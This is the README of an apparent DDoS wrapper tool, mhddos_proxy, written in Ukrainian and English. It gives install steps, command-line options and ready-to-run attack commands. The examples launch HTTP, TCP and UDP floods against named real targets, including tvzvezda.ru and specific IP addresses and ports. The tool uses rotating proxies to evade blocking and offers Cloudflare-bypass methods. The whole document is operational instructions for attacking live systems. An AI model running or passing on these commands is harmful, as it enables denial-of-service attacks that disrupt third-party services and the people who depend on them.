## Інтро

Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).

- **Не потребує VPN** - автоматично скачує і підбирає робочі проксі для заданих цілей, періодично їх оновлюючи
- Атака **декількох цілей** з автоматичним балансуванням навантаження
- Використовує **різні методи для атаки** і змінює їх в процесі роботи
- Простий та зрозумілий інтерфейс з іменованими параметрами

## Intro

Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)

- **No VPN required** - automatically downloads and selects working proxies for given targets
- Support for **multiple targets** with automatic load-balancing
- Uses multiple attack methods and switches between them
- Simpler interface with named arguments

## Setup | Встановлення

### Python

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    python3 -m pip install -r MHDDoS/requirements.txt

### Docker

Встановіть і запустіть Docker

- Windows: https://docs.docker.com/desktop/windows/install/
- Mac: https://docs.docker.com/desktop/mac/install/
- Ubuntu: https://docs.docker.com/engine/install/ubuntu/


      docker pull portholeascend/mhddos_proxy:latest

## Running | Запуск

### Docker

    docker run -it --rm portholeascend/mhddos_proxy:latest COMMAND

### Python

    python3 runner.py COMMAND

## Usage | Використання

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-p PERIOD]
                     [--proxy-timeout TIMEOUT]
                     [--rpc RPC] 
                     [--udp-threads UDP_THREADS]
                     [--debug]
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -t, --threads 1000     Total number of threads (default is 100 * CPU Cores)
      -p, --period 300       How often to update the proxies (default is 300)
      --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
                             Higher values give more proxies, but with lower speed/quality.
                             Parsing also takes more time (default is 2)

      --debug                Enable debug output from MHDDoS
      --rpc 50               How many requests to send on a single proxy connection (default is 50)
      --udp-threads 1        Threads to run per UDP target (default is 1)

      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, STRESS, BOT, DOWNLOADER)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

# Examples | Приклади

For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).

For TCP targets, attack method is TCP FLOOD

For UDP targets, attack method is UDP FLOOD.   
**VPN IS REQUIRED FOR UDP**, proxying is not supported.  
Separate parameter `--udp-threads` controls the load, the default is 1, **INCREASE SLOWLY**, be careful

Для цілей HTTP(S) метод атаки вибирається випадковим чином із параметра `--http-methods` (замовчування див. вище).

Для цілей TCP методом атаки є TCP FLOOD

Для цілей UDP методом атаки є UDP FLOOD.  
**Для UDP ПОТРІБЕН VPN**, проксі не підтримується.  
Окремий параметр `--udp-threads` задає навантаження, за замовчуванням - 1, **ЗБІЛЬШУВАТИ ПОВІЛЬНО**, будьте обережні

    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

    docker run -it --rm portholeascend/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

Target specification

- HTTP(S) by URL - `https://tvzvezda.ru` or `http://tvzvezda.ru`
- HTTP by IP:PORT - `5.188.56.124:9000`
- TCP by IP:PORT - `tcp://194.54.14.131:4477`
- UDP by IP:PORT - `udp://217.175.155.100:53` - **REQUIRES VPN**

Increase load | Збільшити навантаження (підбирайте самостійно, замовчування - 100 на кожне ядро CPU)

    python3 runner.py -t 1000 https://tvzvezda.ru

View DEBUG info (traffic) | Переглянути інформацію про хід атаки

    python3 runner.py https://tvzvezda.ru --debug

Change proxy update interval | Змінити частоту оновлення проксі

    python3 runner.py -p 600 https://tvzvezda.ru

Get more proxies (possibly lower quality) | Більше проксі, але гіршої якості

    python3 runner.py --proxy-timeout 5 https://tvzvezda.ru

Specific HTTP(S) attack method(s) | Обрати метод(и) для HTTP(S) атаки

    python3 runner.py https://tvzvezda.ru --http-methods CFB CFBUAM
